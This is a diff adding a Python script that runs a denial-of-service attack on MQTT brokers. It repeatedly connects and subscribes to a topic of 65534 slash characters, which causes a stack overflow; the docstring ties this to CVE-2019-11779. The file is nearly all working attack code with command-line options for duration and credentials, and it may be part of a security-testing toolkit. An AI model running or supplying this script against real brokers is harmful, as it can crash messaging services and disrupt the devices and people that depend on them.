@@ -1,0 +1,58 @@
+import argparse
+import random
+import mqtt_utilities as util
+import paho.mqtt.client as mqtt
+import time
+
+def generate_topic():
+    topic = ""
+    for i in range(65534):
+        topic += "/"
+    return topic
+
+
+def on_message(client, userdata, message):
+    r_message = message.payload.decode('utf-8')
+    print(f"Received message: " + r_message, flush=True)
+
+def main(username, password, duration=10):
+    """The slash char dos attack subscribes to a topic containing 65400 or more / to cause a stack overflow in the broker exploiting CVE-2019-11779"""
+
+    topic = generate_topic()
+    reconnect_delay = 10
+    connection = util.Connection_status()
+    start_time = time.time()
+
+    while True:
+
+        client = mqtt.Client(
+            mqtt.CallbackAPIVersion.VERSION2, userdata={"connection":connection}, protocol=mqtt.MQTTv5)
+        client.username_pw_set(username, password)
+        client.on_connect = util.on_connect
+        client.on_disconnect = util.on_disconnect
+        client.on_subscribe = util.on_subscribe
+        client.on_unsubscribe = util.on_unsubscribe
+        client.on_message = on_message
+
+        if util.connect_client(client, connection, reconnect_delay):
+            client.subscribe(topic)
+            print("sent malformed SUBSCRIBE packet")
+            time.sleep(0.2 * random.randint(1, 2))
+            client.disconnect()
+        else:
+            print(f"Resetting client and retrying connection in {reconnect_delay} seconds...", flush=True)
+            time.sleep(reconnect_delay)
+
+        elapsed_time = time.time() - start_time
+        print("Execution time: " + str(elapsed_time))
+        if elapsed_time >= duration:
+            print("Time elapsed, execution is terminating...", flush=True)
+            return
+
+if __name__ == "__main__":
+    parser = argparse.ArgumentParser(description="launch a slash_char_dos attack from the local machine")
+    parser.add_argument("-d", "--duration", type=int, help="duration in seconds")
+    parser.add_argument("-u", "--username", type=str, help="username to connect as")
+    parser.add_argument("-p", "--password", type=str, help="password to connect with")
+    args = parser.parse_args()
+    main(args.username, args.password, args.duration)
